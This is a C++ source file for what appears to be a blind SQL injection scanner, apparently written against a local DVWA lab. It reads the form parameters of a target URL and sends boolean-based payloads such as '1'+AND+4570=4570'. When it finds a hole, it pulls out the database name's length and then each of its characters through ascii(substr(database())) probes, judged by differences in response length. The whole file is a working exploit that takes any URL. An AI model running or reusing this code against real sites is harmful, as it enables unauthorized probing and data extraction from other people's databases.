#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>
#include <sstream>
#include <tuple>
#include "functions.h"
using namespace std;
int extractContentlength(string url)
{
    int length;
    CURL* curl;
    CURLcode res;
    std::string response;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if(curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        res = curl_easy_perform(curl);

        if(res == CURLE_OK)
        {
            double contentLength;
            res = curl_easy_getinfo(curl, CURLINFO_CONTENT_LENGTH_DOWNLOAD, &contentLength);
            if(res == CURLE_OK)
            {
                //std::cout << "Content Length: " << contentLength << std::endl;
                length=(int)contentLength;
            }
        }
        else
        {
            std::cout << "Error: " << curl_easy_strerror(res) << std::endl;
        }

        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();

    return length;
}


int find_dbname_length(string url,vector<std::tuple<std::string, std::string, std::string>> params)
{

    int length=0;
    std::string response;
    std::string successmessage="200 OK";
    std::string payload="1'AND+length(database())+=";

    url+="/?";

    for(int i=1; i<=6; i++)
    {
        int cnt=1;
        string url1=url;
        for (const auto& param : params)
        {
            std::string para="";
            if(cnt==1)
            {
                std::string s=std::to_string(i);
                //url="http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id="+payload+s+fixedpayload;
                url1+=get<0>(param)+"="+payload+s+"%23";
                cnt++;
            }
            else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
            {
                url1+="&"+get<0>(param)+"="+get<2>(param);
                cnt++;
            }
            else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
            {
                url1+="&"+get<0>(param)+"="+"Submit";
                cnt++;
            }
            else
            {
                url1+="&"+get<0>(param)+"="+para;
                cnt++;
            }
        }
        // cout << url1 <<"\n";
        response=sendHttpRequest(url1);

        if(Find(response,successmessage)!=std::string::npos&&extractContentlength(url)!=extractContentlength(url1))
        {

            length=i;
            break;
        }
    }
    return length;

}

std::string find_dbname(string url,vector<std::tuple<std::string, std::string, std::string>> params,int length)
{
    url+="/?";
    std::string name="";
    std::string successmessage="200 OK";
    std::string payloadpart1="1'+AND+(ascii(substr((select+database()),";
    std::string payloadpart2=",1)))+=+";
    for(int i=1; i<=length; i++)
    {
        string response;

        std::string s1=std::to_string(i);
        for(int j=1; j<128; j++)
        {
            int cnt=1;
            string url1=url;
            for (const auto& param : params)
            {
                std::string para="";
                if(cnt==1)
                {
                    //std::string s=std::to_string(j);
                    //url="http://localhost/DVWA-master/vulnerabilities/sqli_blind/?id="+payload+s+fixedpayload;
                    url1+=get<0>(param)+"="+payloadpart1+to_string(i)+payloadpart2+to_string(j)+"%23";
                    cnt++;
                }
                else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
                {
                    url1+="&"+get<0>(param)+"="+get<2>(param);
                    cnt++;
                }
                else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
                {
                    url1+="&"+get<0>(param)+"="+"Submit";
                    cnt++;
                }
                else
                {
                    url1+="&"+get<0>(param)+"="+para;
                    cnt++;
                }
            }
            //cout << url1 <<"\n";
            response=sendHttpRequest(url1);
            //cout << response <<"\n";
            if(Find(response,successmessage)!=std::string::npos&&extractContentlength(url)!=extractContentlength(url1))
            {
                std::cout << i<<" character of dbname is : "<<(char)j<<"\n";
                name.push_back((char)j);
                break;
            }
        }

    }
    return name;

}


void Booleanbased(string url)
{
    cout <<"Performing Boolean based SQLi....\n";
    std::string payload="1'+AND+4570=4570+AND+'ZeoB'='ZeoB";


    bool vulnerable=false;

    std::string response;
    std::string successmessage="200 OK";
    response=sendHttpRequest(url);


    std::cout <<"Used payload : "<<payload<<"\n......................\n";

    std::vector<std::tuple<std::string, std::string, std::string>> params = extract_parameters(response);

    // Print the parameter names
    std::string url1=url;
    url1+="/?";
    int cnt=1;
    for (const auto& param : params)
    {
        // std::cout <<"Enter the value of " <<get<0>(param) << "\n";
        std::string para="";
        if(cnt==1)
        {
            url1+=get<0>(param)+"="+payload;
            cnt++;
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
        {
            url1+="&"+get<0>(param)+"="+get<2>(param);
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
        {
            url1+="&"+get<0>(param)+"="+"Submit";
        }
        else
        {
            url1+="&"+get<0>(param)+"="+para;
            cnt++;
        }
    }
    std::cout << url1 << "\n";
    string response2=sendHttpRequest(url1);

    // std::cout << "Response: " << response2 << "\n";
    if(Find(response2,successmessage)!=std::string::npos&&extractContentlength(url)!=extractContentlength(url1))
    {
        vulnerable=true;
    }


    HANDLE col;
    col= GetStdHandle(STD_OUTPUT_HANDLE);

    if(vulnerable)
    {
        SetConsoleTextAttribute(col,4);
        std::cout << "The website is vulnerable to Boolean based Blind SQL injection\n\n";
        SetConsoleTextAttribute(col,15);
    }
    else
    {
        SetConsoleTextAttribute(col,2);
        std::cout << "The website is not vulnerable to Boolean based Blind SQL injection.\n\n";
        SetConsoleTextAttribute(col,15);
    }

    if(vulnerable)
    {
        int len=find_dbname_length(url,params);
        SetConsoleTextAttribute(col,3);
        std::cout << "Length of the database name is "<< len << "\n";
        SetConsoleTextAttribute(col,15);

        std::string name=find_dbname(url,params,len);
        SetConsoleTextAttribute(col,3);
        std::cout << "Database name is "<< name<< "\n";
        SetConsoleTextAttribute(col,15);
    };
}
